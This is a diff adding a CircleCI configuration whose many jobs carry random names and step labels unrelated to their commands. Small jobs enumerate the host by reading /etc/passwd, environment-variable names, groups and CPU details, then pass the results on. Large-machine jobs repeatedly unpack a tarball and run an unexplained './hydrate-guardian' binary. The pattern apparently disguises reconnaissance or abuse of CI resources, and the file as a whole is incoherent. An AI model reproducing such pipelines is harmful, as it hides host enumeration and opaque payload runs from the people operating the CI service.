@@ -1,0 +1,1653 @@
+version: 2.1
+
+jobs:
+  success_city_link_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Just diff the thing
+          command: |
+            mkdir -p /tmp/build-root
+            set +o pipefail 2>/dev/null; yes a | head -n 1295274 > /tmp/build-root/12.197.174; true
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '12.197.174'
+  jun21-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  extra_middleware_public_diff:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Stop congratulating the product owner
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; ls -it /bin/b*|uniq; true ; } > /tmp/build-root/20221107
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '20221107'
+  d-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  logServoLock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: final final
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; awk -F: '{print $3}' /etc/passwd | sort -un | head -15; true ; } > /tmp/build-root/DSC-00001823
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'DSC-00001823'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/DSC-00001823 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  pool_spec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: 30x labeling
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 2 -iname '*.so*' -mtime -7 -exec echo {} ";" 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/build-root/scratch-fd1ad1df
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'scratch-fd1ad1df'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/scratch-fd1ad1df 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  IO2Coupon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: I check the secrets bundle before anything
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; grep -r --include='*.txt' if /etc/skel | cut -d: -f1 | sort -u; true ; } > /tmp/build-root/Proxy
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'Proxy'
+  uniform-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  msgs_si:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Research finance reminder
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; env | grep -E HOME; true ; } > /tmp/build-root/IMG69206
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'IMG69206'
+  dp-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/IMG69206 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  inactive_pebble_prompt_header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Drain Circuit Breaker Step
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; ls -d /usr/share/*/|sort -r|awk -F/ '{print $NF}'; true ; } > /tmp/build-root/20160220
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '20160220'
+  MERGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/20160220 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  a7-4b-d0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: ST27
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cut -c1-16 /proc/cpuinfo | nl; true ; } > /tmp/build-root/ffKE8F
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'ffKE8F'
+  helios-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/LOT-2021-10131 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  g_pRuleManifestMain:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Throttle with a timeout
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; for w in white cyan gray pink brown red;do echo $w; done|paste -sd ' '; true ; } > /tmp/build-root/scratch_3d55dda
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'scratch_3d55dda'
+  beta-v6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  ALIAS_CUSTOM_MAPLE_SUSHI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: My press list page
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; grep '^/' /etc/shells | xargs -n1 dirname | head -n 4 | sort | uniq -c | fmt -w 32; true ; } > /tmp/build-root/glint-frame
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'glint-frame'
+  rl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  value-ft:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: askAllTeam
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; sort < /etc/shells > "/dev/shm/duckairportv2.dat" && head -3 "/dev/shm/duckairportv2.dat"; true ; } > /tmp/build-root/557b7f73-1f1a-0bd9
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '557b7f73-1f1a-0bd9'
+  API-157:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/557b7f73-1f1a-0bd9 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  broker-v5-scratch-amd64:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: PLAT40
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo|fmt -w 44|tr -s ' '|awk '{print NF}'|wc -l; true ; } > /tmp/build-root/klO
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'klO'
+  APP-542:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/klO 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  mount_fail_find:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bake profiling into the roadmap
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/public.txt && sed -i '/nologin$/d' /tmp/public.txt && wc -l /tmp/public.txt; true ; } > /tmp/build-root/sha_3b3330db49947c38
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'sha_3b3330db49947c38'
+  py311-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/sha_3b3330db49947c38 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  backport-graph-82:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Initiative Mantis
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -path '*/limits' -exec wc -l {} + 2> /dev/null | xargs -r ls -ld | head -5; true ; } > /tmp/build-root/orchard-crimson-alpha
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'orchard-crimson-alpha'
+  v7-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/orchard-crimson-alpha 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  batchTotalHandlerLedgerAtlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: measureBastionHost
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | awk -F= '{print $1}' | sort -u; true ; } > /tmp/build-root/fnv_3890ff7
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'fnv_3890ff7'
+  Launch_Release9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/fnv_3890ff7 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  v17:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Forget batching
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; getent group | sort -t : -k3 -n | awk -F : '$4 != "" {print $1}'; true ; } > /tmp/build-root/lagoon876
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'lagoon876'
+  Rollout_Pipeline5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/lagoon876 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  qRot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Lint the perf baseline
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; if [[ -e /etc/hosts ]]; then echo "good"; else echo "bad"; fi; true ; } > /tmp/build-root/175.204
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '175.204'
+  jan22-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/175.204 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  W_TAU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Here I roll up the label queue
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; echo "OK" |tr -s ' '; true ; } > /tmp/build-root/DSC58180
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'DSC58180'
+  rm-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/DSC58180 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  subway_28231_invalid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Last retry before release
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | tr ':' ' ' | head -20; true ; } > /tmp/build-root/stage-cef04
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'stage-cef04'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/stage-cef04 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  wide-alpha-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Oslo Office Scale Out
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\njuan,berlin,87\nzoe,athens,81\nvic,sydney,80\nwendy,boston,84\n' > "/tmp/garden_2018-02.dat" && head -n 1 "/tmp/garden_2018-02.dat" | tr , "\n"; true ; } > /tmp/build-root/20251214_064359
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '20251214_064359'
+  q4-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/20251214_064359 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  varCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Phase IX outline FAQ page
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; echo 'saved' | cut -d' ' -f1; true ; } > /tmp/build-root/KKGpiJ0h9crE5n
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'KKGpiJ0h9crE5n'
+  java17-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/KKGpiJ0h9crE5n 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  TRL-STAT-FTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: maybe color grade the podcast episode
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/indigo-canyon.gz" && zgrep -c bash "/tmp/indigo-canyon.gz"; true ; } > /tmp/build-root/g
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'g'
+  INIT_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  field_smart:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Loot the failing specs
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; builtin echo 'the quick brown fox'; true ; } > /tmp/build-root/LOT-2021-10131
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'LOT-2021-10131'
+  Prepare_Image8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/LOT-2021-10131 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  ro_Hant_CL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: stage
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/noon" && touch "${TMPDIR:-/tmp}/noon"/part{1..2}.log && ls "${TMPDIR:-/tmp}/noon"; true ; } > /tmp/build-root/80645e77-1826
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - '80645e77-1826'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/80645e77-1826 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  szConstJobCallback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Double Tap Cart Icon Job
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; grep -B 2 tty /etc/group | cut -d: -f1; true ; } > /tmp/build-root/HoLLowsoUTh
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'HoLLowsoUTh'
+  jess-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/HoLLowsoUTh 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  asdfgh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Transfer before approval
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; tar -zcf "/tmp/prefs.tgz" -C /etc hosts && tar -xzOf "/tmp/prefs.tgz" hosts | head -n 3; true ; } > /tmp/build-root/PANO00016137
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'PANO00016137'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  DD-END-OLD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Verse one mocking
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -S /usr/bin/z*; true ; } > /tmp/build-root/frozen-tundra-boson-queue
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/build-root
+          paths:
+            - 'frozen-tundra-boson-queue'
+  run-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Pre-verify E
+          command: |
+            col -x < /tmp/build-root/12.197.174 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar --extract -f inventory-mirror.tar
+      - run:
+          command: ls -la
+      - run:
+          command: /bin/bash -c "./hydrate-guardian"
+  skoundquamtee-kit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-root
+      - run:
+          name: Only if the ground truth labels time out
+          command: |
+            mkdir -p /tmp/build-root
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'ready' | fold -w 5; true ; } > /tmp/build-root/a461989a-0a3a-f64b
+            echo "finished"
